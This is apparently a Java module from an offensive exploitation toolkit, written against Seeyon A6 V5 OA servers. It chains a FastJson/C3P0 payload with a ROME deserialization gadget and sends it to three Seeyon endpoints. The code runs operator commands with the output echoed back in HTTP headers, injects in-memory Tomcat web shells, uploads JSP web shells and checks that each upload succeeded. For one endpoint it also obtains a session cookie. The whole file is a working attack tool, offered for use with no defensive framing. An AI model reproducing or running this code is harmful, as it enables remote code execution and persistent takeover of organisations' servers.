package com.droplab.Controller.Seeyon.Service;

import com.droplab.Controller.FastJson.Service.FastJsonC3P0Other;
import com.droplab.Controller.Seeyon.Common.A6V5V6SessionGet;
import com.droplab.Controller.Seeyon.Common.ROMEObject;
import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.Echo.TomcatEcho;
import com.droplab.Utils.Factory.CodeFactory;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.Utils.Memory.MemroyFactory;
import com.droplab.Utils.ResponseUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;

import java.io.File;
import java.nio.file.Files;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;

public class A6V5FastJson extends BugService {
    private final String contentPath = "/main.do?method=changeLocale";
    private final String contentPath2 = "/sursenServlet";
    private final String contentPath3 = "/ajax.do?method=ajaxAction&rnd=87507";

    @Override
    public Object run(String type) {
        try {
            if (params.size() > 0) {
                String uType = null;  //区分不同的url的fastjson利用
                String url = null;
                String cmd = null;
                String mOption = null;
                String filepath = null;
                String filename = null;
                String mType = null;
                String mMiddle = null;
                String path = null;
                String mshellType = null;
                String password = null;
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()) {
                    String key = iterator.next();
                    if (key.equals("uType")) {
                        uType = params.get(key);
                    } else if (key.equals("url")) {
                        url = params.get(key);
                    } else if (key.equals("cmd")) {
                        cmd = params.get(key);
                    } else if (key.equals("filepath")) {
                        filepath = params.get(key);
                    } else if (key.equals("filename")) {
                        filename = params.get(key);
                    } else if (key.equals("mType")) {
                        mType = params.get(key);
                    } else if (key.equals("mMiddle")) {
                        mMiddle = params.get(key);
                    } else if (key.equals("path")) {
                        path = params.get(key);
                    } else if (key.equals("mshellType")) {
                        mshellType = params.get(key);
                    } else if (key.equals("password")) {
                        password = params.get(key);
                    } else if (key.equals("mOption")) {
                        mOption = params.get(key);
                    }
                }
                if (!mOption.equals("")) {
                    String code = null;
                    String memory = null;
                    switch (mOption) {
                        case "Execute": //回显命令执行
                            if (mType.equals("Tomcat")) {
                                code = TomcatEcho.instance().getTomcatEchoExecString("template");
                            } else {

                            }
                            break;
                        case "MemoryShell":
                            code = TomcatEcho.instance().getTomcatEchoDefineClass("", "template");
                            memory = MemroyFactory.instance().getMemoryShell(mType, mMiddle, password, mshellType, path,false);
                            break;
                        case "UploadShell":
                        default:
                            if (new File(filepath).exists()) {
                                code = CodeFactory.instance().getUploadShell("template", "com.alibaba.fastjson.JSON", filename, new File(filepath));
                            }
                            break;
                    }
                    if (code != null) {
                        byte[] decode = Base64.getDecoder().decode(code);
                        byte[] object = ROMEObject.instance().getObject(decode);//rome反序列化链
                        File file = new File(System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp");
                        Files.write(file.toPath(), object);
                        FastJsonC3P0Other o = (FastJsonC3P0Other) Class.forName("com.droplab.Controller.FastJson.Service.FastJsonC3P0Other").newInstance();
                        HashMap hashMap = new HashMap();
                        hashMap.put("filepath", file.getAbsolutePath());
                        o.setParams(hashMap);
                        Connection.Response exploit = o.exploit();
                        String payload = new String(exploit.bodyAsBytes());
                        file.delete();
                        HashMap paramMap = new HashMap();
                        String finalUrl = null;
                        HashMap<String, String> headers = new HashMap<>();
                        CommonUtils.hashMapClone(InfoUtils.headers, headers);
                        headers.put("Referer", url);

                        if (uType.equals("changeLocale")) {
                            paramMap.put("_json_params", payload);
                            finalUrl = url + contentPath;
                        }
                        if (uType.equals("sursenServlet")) {
                            paramMap.put("sursenData", payload);
                            finalUrl = url + contentPath2;
                        }
                        if(uType.equals("portalManager")){
                            paramMap.put("managerName","portalManager");
                            paramMap.put("managerMethod","getSpaceMenusForPortal");
                            paramMap.put("arguments",payload);
                            finalUrl = url + contentPath3;

                            String cookie = A6V5V6SessionGet.instance().getCookie("", url);
                            headers.put("Cookie",cookie);
                        }


                        ResponseUtils responseUtils = new ResponseUtils();
                        switch (mOption) {
                            case "Execute": //回显命令执行
                                headers.put("Testdmc", cmd);
                                headers.put("Testecho", "Testecho");
                                Connection.Response post = HttpUtils.post(headers, finalUrl, paramMap);
                                if (post.hasHeader("Testdmc") && post.hasHeader("Testecho")) {
                                    String[] testcmd = post.header("Testdmc").split(",");
                                    byte[] decode1 = Base64.getDecoder().decode(testcmd[0]);
                                    responseUtils.setMessage(new String(decode1));
                                }
                                break;
                            case "MemoryShell":
                                paramMap.put("dy", memory);
                                Connection.Response post1 = HttpUtils.post(headers, finalUrl, paramMap);
                                if (post1.hasHeader("Testecho")) {
                                    responseUtils.setMessage("获取Testecho，注入成功！！！");
                                }
                                break;
                            case "UploadShell":
                            default:
                                Connection.Response post2 = HttpUtils.post(headers, finalUrl, paramMap);
                                Thread.sleep(3 * 1000);
                                Connection.Response response = HttpUtils.get(url + "/" + filename + ".jsp", headers);
                                if (new String(response.bodyAsBytes()).contains("this is testing <||>")) {
                                    responseUtils.setMessage("上传文件成功");
                                }
                                break;
                        }
                        return responseUtils;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
